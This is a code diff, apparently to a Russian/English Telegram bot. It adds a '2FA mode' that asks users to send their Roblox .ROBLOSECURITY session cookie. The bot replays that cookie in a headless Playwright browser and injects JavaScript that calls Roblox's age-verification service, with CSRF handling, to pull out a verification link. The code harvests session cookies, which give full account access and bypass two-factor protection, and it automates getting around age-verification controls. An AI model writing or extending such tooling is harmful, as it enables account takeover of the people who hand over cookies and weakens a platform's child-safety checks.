@@ -278,6 +278,7 @@ TEXTS = {
         "ask_2fa": "На каком аккаунте получить ссылку?",
         "btn_no_2fa": "🔓 Без 2FA",
         "btn_with_2fa": "🔐 С 2FA",
+        "2fa_ask_cookie": "🔐 *Режим 2FA*\n\nОтправь `.ROBLOSECURITY` cookie\nСообщение будет удалено автоматически",
         "2fa_wip": "⚙️ Функция в доработке!\n\nПоддержка аккаунтов с 2FA скоро появится.",
     },
     "en": {
@@ -358,6 +359,7 @@ TEXTS = {
         "ask_2fa": "Which account type do you want to verify?",
         "btn_no_2fa": "🔓 Without 2FA",
         "btn_with_2fa": "🔐 With 2FA",
+        "2fa_ask_cookie": "🔐 *2FA Mode*\n\nSend your `.ROBLOSECURITY` cookie\nMessage will be deleted automatically",
         "2fa_wip": "⚙️ Feature in development!\n\nSupport for 2FA accounts is coming soon.",
     }
 }
@@ -577,6 +579,120 @@ def get_url_via_api(cookie, method):
     except Exception as e:
         logging.error("API error: %s", e)
         return None
+
+
+TWO_FA_JS = """
+(async () => {
+  const url  = 'https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification';
+  const body = JSON.stringify({ generateLink: true, ageEstimation: true, parentVerification: false });
+
+  const send = (csrf) => fetch(url, {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json;charset=utf-8',
+      ...(csrf ? { 'x-csrf-token': csrf } : {}),
+    },
+    body,
+  });
+
+  let r = await send(null);
+  const csrf = r.headers.get('x-csrf-token');
+  console.log('1st:', r.status, 'csrf:', csrf);
+
+  if (csrf) r = await send(csrf);
+
+  const text = await r.text();
+  console.log('2nd:', r.status);
+  try { console.log(JSON.parse(text)); } catch { console.log(text); }
+
+  // Store result for Python to pick up
+  try {
+    const parsed = JSON.parse(text);
+    window.__2fa_result = parsed;
+  } catch {
+    window.__2fa_result = { raw: text };
+  }
+})();
+"""
+
+
+def playwright_get_url_2fa(cookie, method):
+    """
+    Playwright метод для аккаунтов с 2FA.
+    Открывает браузер, ждёт прохождения 2FA,
+    затем выполняет JS-скрипт в консоль для получения ссылки.
+    """
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            ctx = browser.new_context(
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+                viewport={"width": 1280, "height": 800}
+            )
+            ctx.add_cookies([{"name": ".ROBLOSECURITY", "value": cookie, "domain": ".roblox.com", "path": "/"}])
+            page = ctx.new_page()
+            page.add_init_script(INJECT_SCRIPT)
+            page.goto("https://www.roblox.com/my/account#!/info", wait_until="networkidle", timeout=30000)
+            page.wait_for_timeout(3000)
+
+            # Проверяем: идёт ли 2FA проверка (security check / verification page)
+            two_fa_indicators = [
+                "verification", "verify", "security check",
+                "проверка", "подтверд", "двухфакторн", "two-step",
+                "2-step", "two step", "authenticator"
+            ]
+            page_content = ""
+            try:
+                page_content = page.content().lower()
+            except Exception:
+                pass
+
+            is_2fa = any(kw in page_content for kw in two_fa_indicators)
+            logging.info("2FA check: page has 2FA indicators = %s", is_2fa)
+
+            if is_2fa:
+                # Выполняем JS-скрипт прямо как в видео (в консоль)
+                logging.info("2FA: executing JS snippet in console")
+                try:
+                    page.evaluate(TWO_FA_JS)
+                except Exception as e:
+                    logging.warning("2FA JS eval error (async, ok to ignore): %s", e)
+
+                # Ждём появления результата
+                result_url = None
+                for i in range(15):
+                    page.wait_for_timeout(1000)
+                    try:
+                        # Сначала пробуем __capturedData (из INJECT_SCRIPT)
+                        raw = page.evaluate("() => window.__capturedData")
+                        if raw:
+                            result_url = build_url(raw)
+                            if result_url:
+                                logging.info("2FA: captured via __capturedData after %d sec", i + 1)
+                                break
+
+                        # Затем пробуем __2fa_result (из TWO_FA_JS)
+                        r2 = page.evaluate("() => window.__2fa_result")
+                        if r2 and isinstance(r2, dict) and "raw" not in r2:
+                            result_url = extract_link_from_api(r2)
+                            if result_url:
+                                logging.info("2FA: captured via __2fa_result after %d sec", i + 1)
+                                break
+                    except Exception:
+                        pass
+
+                browser.close()
+                return result_url
+
+            else:
+                # Нет 2FA — стандартный Playwright flow
+                browser.close()
+                return playwright_get_url(cookie, method)
+
+    except Exception as e:
+        logging.error("Playwright 2FA error: %s", e)
+        return "ERROR: " + str(e)
 
 
 def _extract_api_url(response):
@@ -1059,13 +1175,28 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WAITING_MENU
 
     if data == "2fa_yes":
+        # Шаг 2 — выбор метода (Camera / ID) для 2FA аккаунта
         await query.edit_message_text(
-            t(user_id, "2fa_wip"),
+            t(user_id, "choose_method"),
+            parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton(t(user_id, "btn_camera"), callback_data="choose_camera_2fa")],
+                [InlineKeyboardButton(t(user_id, "btn_id"), callback_data="choose_id_2fa")],
                 [InlineKeyboardButton(t(user_id, "btn_back"), callback_data="get_link")],
             ])
         )
         return WAITING_MENU
+
+    if data in ["choose_camera_2fa", "choose_id_2fa"]:
+        method = "camera" if data == "choose_camera_2fa" else "id"
+        context.user_data["method"] = method
+        context.user_data["has_2fa"] = True
+        method_name = t(user_id, "method_camera") if method == "camera" else t(user_id, "method_id")
+        await query.edit_message_text(
+            t(user_id, "2fa_ask_cookie"),
+            parse_mode="Markdown"
+        )
+        return WAITING_COOKIE
 
     if data == "2fa_no":
         # Шаг 2 — выбор метода (Camera / ID)
@@ -1374,15 +1505,21 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     loop = asyncio.get_event_loop()
     _start_time = _time.time()
+    has_2fa = context.user_data.get("has_2fa", False)
 
-    # Сначала быстрый API метод (~2 сек)
-    result = await loop.run_in_executor(executor, get_url_via_api, cookie, method)
-    logging.info("API result: %s", result)
+    if has_2fa:
+        # Для 2FA аккаунтов сразу используем Playwright с JS-скриптом
+        result = await loop.run_in_executor(executor, playwright_get_url_2fa, cookie, method)
+        logging.info("2FA result: %s", result)
+    else:
+        # Сначала быстрый API метод (~2 сек)
+        result = await loop.run_in_executor(executor, get_url_via_api, cookie, method)
+        logging.info("API result: %s", result)
 
-    # Если API не сработал — используем Playwright (~30 сек)
-    if not result:
-        await msg.edit_text(t(user_id, "browser_fallback"))
-        result = await loop.run_in_executor(executor, playwright_get_url, cookie, method)
+        # Если API не сработал — используем Playwright (~30 сек)
+        if not result:
+            await msg.edit_text(t(user_id, "browser_fallback"))
+            result = await loop.run_in_executor(executor, playwright_get_url, cookie, method)
 
     elapsed = round(_time.time() - _start_time)
 
@@ -1404,6 +1541,7 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(t(user_id, "failed_returned"))
         await send_log(update.get_bot(), user_id, username, method, t(user_id, "log_result_fail"), elapsed, False)
 
+    context.user_data["has_2fa"] = False
     await update.message.reply_text(
         t(user_id, "main_menu_title") + chr(10) + chr(10) +
         t(user_id, "main_menu_attempts", attempts=db_get_attempts(user_id)) + chr(10) + chr(10) +
